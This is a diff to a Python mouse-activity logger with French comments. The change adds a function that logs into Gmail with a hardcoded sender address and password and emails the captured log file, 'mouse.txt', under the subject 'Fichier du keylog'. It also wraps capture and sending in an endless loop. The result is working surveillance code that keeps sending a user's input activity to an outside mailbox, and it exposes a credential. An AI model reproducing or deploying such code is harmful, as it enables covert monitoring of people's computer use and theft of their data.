@@ -1,4 +1,11 @@
 import logging
+import smtplib
+import ssl
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
 from pynput import mouse
 import time
 
@@ -35,23 +42,6 @@ def on_mouse_move(mouse_position_x, mouse_position_y):
     print(message)
     logging.debug(message)
 
-"""
-def on_mouse_scroll(mouse_position_x, mouse_position_y, scroll_x_change, scroll_y_change):
-    message = ""
-    if scroll_x_change < 0:
-        message = "User is scrolling to the left"
-    elif scroll_x_change > 0:
-        message = "User is scrolling to the right"
-    if scroll_y_change > 0:
-        message = "User is scrolling up the page"
-    elif scroll_y_change < 0:
-        message = "User is scrolling down the page"
-
-    print(message)
-    logging.debug(message)
-    logging.debug(f"Scroll change deltas: {scroll_x_change}, {scroll_y_change}")
-    """
-
 
 def on_mouse_click(mouse_position_x, mouse_position_y, button, is_pressed):
     if button == mouse.Button.middle and is_pressed:
@@ -63,17 +53,56 @@ def on_mouse_click(mouse_position_x, mouse_position_y, button, is_pressed):
     logging.debug(message)
 
 
-# Crée un listener pour la souris
-mouse_listener = mouse.Listener(
-    on_move=on_mouse_move,
-    #on_scroll=on_mouse_scroll,
-    on_click=on_mouse_click
-)
+# Fonction pour envoyer un email
+def sendMail():
+    port = 465
+    smtp_server = "smtp.gmail.com"
+    sender_email = "amazonoussama640@gmail.com"  # adresse mail bidon d'où le mail va être envoyé
+    receiver_email = "oussamaau123@gmail.com"  # adresse mail sur laquelle on veut recevoir le mail
+    password = "tdcf hoql nrco flxv"
+    objet = "Fichier du keylog"
+    corps = "Envoi du fichier de la souris"
 
-# Démarre le listener
-print("Starting the mouse listener, will be active for 5 seconds...")
-mouse_listener.start()
-time.sleep(5)  # Laisse le script dormir pendant 5 secondes
-print("Time's up, stopping the mouse listener")
-mouse_listener.stop()
-mouse_listener.join()
+    message = MIMEMultipart()
+    message["From"] = sender_email
+    message["To"] = receiver_email
+    message["Subject"] = objet
+
+    message.attach(MIMEText(corps, "plain"))
+
+    filename = "mouse.txt"
+
+    with open(filename, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+
+    encoders.encode_base64(part)
+
+    part.add_header(
+        "Content-Disposition",
+        f"attachment; filename= {filename}",
+    )
+    message.attach(part)
+
+    context = ssl.create_default_context()
+
+    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, message.as_string())
+
+
+while True:
+    print("Starting the mouse listener, will be active for 5 seconds...")
+    mouse_listener = mouse.Listener(
+        on_move=on_mouse_move,
+        on_click=on_mouse_click
+    )
+    mouse_listener.start()
+
+    time.sleep(5)
+
+    print("Time's up, stopping the mouse listener")
+    mouse_listener.stop()
+    mouse_listener.join()
+
+    sendMail()
